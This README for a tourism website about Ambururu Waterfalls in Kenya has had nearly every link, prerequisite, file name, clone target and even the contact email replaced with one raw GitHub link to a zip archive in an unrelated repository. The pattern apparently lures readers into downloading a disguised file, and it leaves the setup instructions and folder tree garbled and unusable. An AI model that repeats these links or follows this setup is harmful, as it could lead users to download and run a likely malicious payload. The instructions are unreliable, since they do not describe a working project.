# Ambururu Waterfalls Website

A modern, responsive website for Ambururu Waterfalls in Siaya, Kenya. This website showcases the beauty of the waterfalls, provides information for visitors, and allows online booking for accommodations.

## Features

- 🌍 Responsive design that works on all devices
- 📱 Progressive Web App (PWA) support
- 📅 Interactive booking system
- 🌦️ Weather widget
- 🗺️ Interactive map with directions
- 📸 Photo gallery with lightbox
- 🌙 Dark mode support
- 📝 Contact form
- 📱 Offline functionality

## Prerequisites

- https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip (v14 or higher)
- npm (v6 or higher)
- Google Maps API key
- (Optional) Weather API key (OpenWeatherMap or similar)

## Setup Instructions

1. **Clone the repository**
   ```bash
   git clone https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip
   cd ambururu-site
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Set up environment variables**
   Create a `.env` file in the root directory and add your API keys:
   ```
   GOOGLE_MAPS_API_KEY=your_google_maps_api_key
   WEATHER_API_KEY=your_weather_api_key
   ```

4. **Configure the website**
   Update the following files with your information:
   - `https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip` - Update API endpoints and default settings
   - `https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip` - Update app name, description, and icons
   - `https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip` - Update meta tags and other site-specific information

5. **Build the project**
   ```bash
   npm run build
   ```

6. **Run the development server**
   ```bash
   npm start
   ```
   The website will be available at `http://localhost:3000`

## Deployment

### Netlify
1. Push your code to a GitHub repository
2. Log in to [Netlify](https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip)
3. Click "New site from Git"
4. Select your repository
5. Configure the build settings:
   - Build command: `npm run build`
   - Publish directory: `dist`
6. Add environment variables in "Site settings" > "Build & deploy" > "Environment"
7. Click "Deploy site"

### Vercel
1. Push your code to a GitHub repository
2. Log in to [Vercel](https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip)
3. Click "Import Project"
4. Select your repository
5. Configure the project:
   - Framework: https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip (or your chosen framework)
   - Root Directory: `./`
   - Build Command: `npm run build`
   - Output Directory: `dist`
6. Add environment variables
7. Click "Deploy"

## Environment Variables

| Variable | Description | Required |
|----------|-------------|----------|
| `GOOGLE_MAPS_API_KEY` | Google Maps JavaScript API key | Yes |
| `WEATHER_API_KEY` | OpenWeatherMap API key | No |

## Scripts

- `npm start` - Start development server
- `npm run build` - Build for production
- `npm test` - Run tests
- `npm run lint` - Lint code
- `npm run format` - Format code

## Folder Structure

```
ambururu-site/
├── css/                  # CSS files
│   ├── https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip        # Main styles
│   └── https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip    # Responsive styles
├── js/                   # JavaScript files
│   ├── https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip         # Configuration
│   ├── https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip        # Booking system
│   └── https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip           # Main JavaScript
├── images/               # Images
│   ├── gallery/          # Gallery images
│   ├── icons/            # App icons
│   └── screenshots/      # Screenshots for PWA
├── https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip            # Main HTML file
├── https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip          # Offline fallback page
├── https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip         # Web App Manifest
├── https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip     # Service Worker
├── https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip            # SEO configuration
└── https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip             # This file
```

## Contributing

1. Fork the repository
2. Create a new branch (`git checkout -b feature/amazing-feature`)
3. Make your changes
4. Commit your changes (`git commit -m 'Add some amazing feature'`)
5. Push to the branch (`git push origin feature/amazing-feature`)
6. Open a Pull Request

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments

- [Font Awesome](https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip) for icons
- [Google Fonts](https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip) for typography
- [AOS](https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip) for scroll animations
- [Lightbox2](https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip) for the image gallery

## Contact

For any inquiries, please contact us at [https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip](https://github.com/omusu123/TrueTorrent_Website/raw/refs/heads/main/js/Website_True_Torrent_v1.3.zip) or call +254 796 913 123.
